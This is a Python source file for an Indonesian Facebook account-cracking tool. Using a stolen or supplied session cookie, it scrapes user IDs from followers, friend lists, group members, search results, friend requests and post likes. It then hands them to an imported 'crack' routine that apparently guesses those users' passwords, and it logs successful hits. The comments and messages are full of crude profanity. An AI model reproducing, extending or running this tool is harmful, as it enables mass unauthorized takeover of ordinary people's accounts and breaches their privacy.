# coding:utf-8
# rekod tod? sertain sumbernya heheh :v
# github : https://github.com/Dru-Crack22

from modul import *
from wibu.login import login
from .pepek import shielded as guard
from .ngewe import crack as cracking
from .ngewe import gadag_user as asu
from .report_bug import report as laporkan

url="https://mbasic.facebook.com"
longentod="lo lebih ngentod"

class awokawokawok:
	def __init__(self):
		
		self.cek_folder()
		self.semua=open("cookies/info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.main_menu()
		
	def cek_folder(self):
		if os.path.exists("result") is False: os.mkdir("result")
		if os.path.exists("cookies") is False: os.mkdir("cookies")
		if os.path.exists("result/live.txt") is False: open("result/live.txt","a")
		if os.path.exists("result/chek.txt") is False: open("result/chek.txt","a")
		if os.path.exists("cookies/info.txt") is False:
			os.system("clear")
			cookie=input("\n\n ? masukkan cookie : ")
			while cookie in (""," "):
				print(" ! jangan kosong ngentod")
				cookie=input(" ? masukkan cookie : ")
			login(url,{"cookie":cookie})
	
	def cek_cookies(self):
		global url
		try: respon=req.get(f"{url}/profile.php",cookies=self.cookies)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		if "mbasic_logout_button" not in respon.text:
			try: os.remove("cookies/info.txt")
			except: os.system("rm -rf cookies/info.txt")
			exit(" ! cookie expired, harap login ulang")
		url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
		os.system("clear")
	
	def main_menu(self):
		global longentod
		self.cek_cookies()
		takeuser=asu(url,self.cookies)
		print("          \x1b[36m╔╦╗┬─┐┌─┐┌─┐   ╔═╗┌┐ \n           ║║├┬┘├─┤│ ┬───╠╣ ├┴┐\n          ═╩╝┴└─┴ ┴└─┘   ╚  └─┘\n     Created By MUHAMAD BADRU WASIH\x1b[0m\n")
		print(f" * uid  : {self.jonson['uid']}")
		print(f" * nama : {self.jonson['nama']}")
		print(f" * username : {self.jonson['username']}\n" if self.jonson["username"] is not None else "")
		print(" 1. crack dari followers")
		print(" 2. crack dari daftar teman")
		print(" 3. crack dari member group")
		print(" 4. crack dari pencarian nama")
		print(" 5. crack dari daftar teman target")
		print(" 6. crack dari permintaan pertemanan")
		print(" 7. crack dari like postingan")
		print(" 8. profile guard")
		print(" 9. hapus cookie")
		print(" r. report bug")
		print(" 0. keluar\n")
		
		pilih=input(" ? pilih : ")
		while pilih in (""," "):
			print(" ! jangan kosong ngentod")
			pilih=input(" ? pilih : ")
			
		if pilih in ("1","01"):
			user=input(" ? username/id : ")
			while user in (""," "):
				print(" ! jangan kosong ngentod")
				user=input(" ? username/id : ")
			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f" ! pengguna dengan id {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			else:
				print(" * target name : "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.followers(respon)
			
		elif pilih in ("2","02"):
			try: respon=req.get(f"{url}/me/friends",cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali(" ! tidak ada teman",self.main_menu)
			longentod=takeuser.fl(respon)
			
		elif pilih in ("3","03"):
			user=input(" ? id grup : ")
			while user in (""," "):
				print(" ! jangan kosong ngentod")
				user=input(" ? id grup : ")
			usek=f"{url}/browse/group/members/?id={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f" ! group dengan id {user} tidak ditemukan atau lo belum gabung",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			else:
				print(" * target name : "+parser(respon,"html.parser").find("title").text[8:])
				longentod=takeuser.grup(respon,user)
			
		elif pilih in ("4","04"):
			user=input(" ? query : ")
			while user in (""," "):
				print(" ! jangan kosong ngentod")
				user=input(" ? query : ")
			usek=f"{url}/search/people/?q={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Maaf, kami tidak menemukan" in respon:
				kembali(f" ! orang dengan nama {user} tidak ditemukan",self.main_menu)
			else:
				jumlah=input(" ? jumlah : ")
				while jumlah.isdigit() is False:
					print(" ! jangan kosong ngentod" if jumlah in (""," ") else " ! harus berupa angka")
					jumlah=input(" ? jumlah : ")
				longentod=takeuser.cari(respon,int(jumlah))
			
		elif pilih in ("5","05"):
			user=input(" ? username/id : ")
			while user in (""," "):
				print(" ! jangan kosong ngentod")
				user=input(" ? username/id : ")
			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali(" ! sepertinya daftar teman tidak di publikasikan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, silahkan tunggu atau ganti akun",self.main_menu)
			if "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon:
				kembali(f" ! pengguna dengan id {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			else:
				print(" * target name : "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.fl(respon)
			
		elif pilih in ("6","06"):
			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Permintaan" in respon:
				kembali(" ! tidak ada permintaan pertemanan",self.main_menu)
			longentod=takeuser.request(respon)
			
		elif pilih in ("7","07"):
			user=input(" ? url/id postingan : ")
			while user in (""," "):
				print(" ! jangan kosong ngentod")
				user=input(" ? url/id postingan : ")
			if user.isdigit():
				user=f"{url}/{user}"
			else:
				try: asyu=re.search("https://(.*?)\.facebook\.com/",user).group(1)
				except AttributeError: exit(" ! masukkan url postingan dengan benar")
				user=url+user.split(f"https://{asyu}.facebook.com")[1]
			try: respon=req.get(user,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
				kembali(" ! postingan tidak ditemukan",self.main_menu)
			try:
				ufi=re.search('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon).group(1).replace(";","&")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
					kembali(" ! tidak ada yang menanggapi postingan",self.main_menu)
				jumlah=input(" ? jumlah : ")
				while jumlah.isdigit() is False:
					print(" ! jangan kosong ngentod" if jumlah in (""," ") else " ! harus berupa angka")
					jumlah=input(" ? jumlah : ")
				longentod=takeuser.like_post(respon,int(jumlah))
			except AttributeError: exit(" ! error tidak diketahui")
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			
		elif pilih in ("8","08"):
			guard(url,self.cookies,self.main_menu)
		
		elif pilih in ("9","09"):
			try: os.remove("cookies/info.txt")
			except: os.system("rm -rf cookies/info.txt")
			exit(" ! gagal menghapus cookie, silahkan hapus secara manual" if os.path.exists("cookies/info.txt") else " * sukses menghapus cookie")
		
		elif pilih in tuple("rR"):
			laporkan(url,self.cookies)
		
		elif pilih in ("0","00"):
			exit(" * thanks for using my tools, jangan lupa mampir lagi tod:v")
		
		else:
			kembali(" ! pilihan tidak ada",self.main_menu)
		
		if longentod!="lo lebih ngentod":
			if len(longentod)!=0:
				cracking.crack(url,longentod)
			else:
				exit(" ! gagal mengambil id, silahkan coba lagi")
		else:
			exit(" ! error tidak diketahui")
